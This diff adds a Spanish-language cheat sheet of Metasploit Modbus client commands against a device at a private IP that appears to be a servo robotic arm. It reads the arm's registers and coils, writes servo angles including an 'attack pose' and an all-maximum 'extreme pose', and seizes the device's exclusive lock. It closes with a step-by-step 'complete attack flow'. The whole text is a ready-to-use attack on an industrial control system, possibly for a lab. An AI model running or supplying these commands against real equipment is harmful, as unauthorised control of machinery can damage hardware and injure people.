@@ -1,0 +1,145 @@
+# Leer los 6 registros de servo (REG 100-105)
+use auxiliary/scanner/scada/modbusclient
+set RHOSTS 10.197.4.77
+set RPORT 502
+set UNIT_NUMBER 1
+set ACTION READ_HOLDING_REGISTERS
+set DATA_ADDRESS 100
+set NUMBER 6
+run
+
+# Leer el estado del lock (REG 200-203)
+set ACTION READ_HOLDING_REGISTERS
+set DATA_ADDRESS 200
+set NUMBER 4
+run
+
+# Leer un solo servo — pinza (REG 100)
+set ACTION READ_HOLDING_REGISTERS
+set DATA_ADDRESS 100
+set NUMBER 1
+run
+
+# Leer coils — estado del LED (COIL 0)
+set ACTION READ_COILS
+set DATA_ADDRESS 0
+set NUMBER 1
+run
+
+# Leer discrete inputs
+set ACTION READ_DISCRETE_INPUTS
+set DATA_ADDRESS 0
+set NUMBER 1
+run
+
+# Leer input registers
+set ACTION READ_INPUT_REGISTERS
+set DATA_ADDRESS 100
+set NUMBER 6
+run
+
+WRITE — Escritura de un registro
+bash# Escribir servo Pinza a 0 grados (REG 100)
+set ACTION WRITE_REGISTER
+set DATA_ADDRESS 100
+set DATA 0
+run
+
+# Escribir servo Base a 180 grados (REG 105)
+set ACTION WRITE_REGISTER
+set DATA_ADDRESS 105
+set DATA 180
+run
+
+# Escribir servo Hombro a 45 grados (REG 104)
+set ACTION WRITE_REGISTER
+set DATA_ADDRESS 104
+set DATA 45
+run
+
+# Solicitar el lock exclusivo (REG 200 = 0xA5A5 = 42405)
+set ACTION WRITE_REGISTER
+set DATA_ADDRESS 200
+set DATA 42405
+run
+
+# Liberar el lock (REG 200 = 0)
+set ACTION WRITE_REGISTER
+set DATA_ADDRESS 200
+set DATA 0
+run
+
+WRITE — Escritura de múltiples registros
+bash# Poner todos los servos a 0 grados de una vez
+set ACTION WRITE_REGISTERS
+set DATA_ADDRESS 100
+set DATA_REGISTERS 0,0,0,0,0,0
+run
+
+# Poner todos los servos a 90 grados (posicion de reposo)
+set ACTION WRITE_REGISTERS
+set DATA_ADDRESS 100
+set DATA_REGISTERS 90,90,90,90,90,90
+run
+
+# Pose de ataque personalizada
+set ACTION WRITE_REGISTERS
+set DATA_ADDRESS 100
+set DATA_REGISTERS 138,144,112,75,153,97
+run
+
+# Pose extrema — todos al maximo
+set ACTION WRITE_REGISTERS
+set DATA_ADDRESS 100
+set DATA_REGISTERS 180,180,180,180,180,180
+run
+
+WRITE — Coils (LED)
+bash# Encender el LED (COIL 0 = 1)
+set ACTION WRITE_COIL
+set DATA_ADDRESS 0
+set DATA 1
+run
+
+# Apagar el LED (COIL 0 = 0)
+set ACTION WRITE_COIL
+set DATA_ADDRESS 0
+set DATA 0
+run
+
+# Escribir multiples coils
+set ACTION WRITE_COILS
+set DATA_ADDRESS 0
+set DATA_COILS 1
+run
+
+Flujo completo de ataque con Metasploit
+bash# Paso 1: reconnaissance — leer estado actual
+set ACTION READ_HOLDING_REGISTERS
+set DATA_ADDRESS 100
+set NUMBER 6
+run
+
+# Paso 2: tomar el lock exclusivo
+set ACTION WRITE_REGISTER
+set DATA_ADDRESS 200
+set DATA 42405
+run
+
+# Paso 3: verificar que tenemos el lock
+set ACTION READ_HOLDING_REGISTERS
+set DATA_ADDRESS 200
+set NUMBER 4
+run
+
+# Paso 4: mover el brazo a posicion de ataque
+set ACTION WRITE_REGISTERS
+set DATA_ADDRESS 100
+set DATA_REGISTERS 0,0,0,0,0,0
+run
+
+# Paso 5: liberar el lock al terminar
+set ACTION WRITE_REGISTER
+set DATA_ADDRESS 200
+set DATA 0
+run
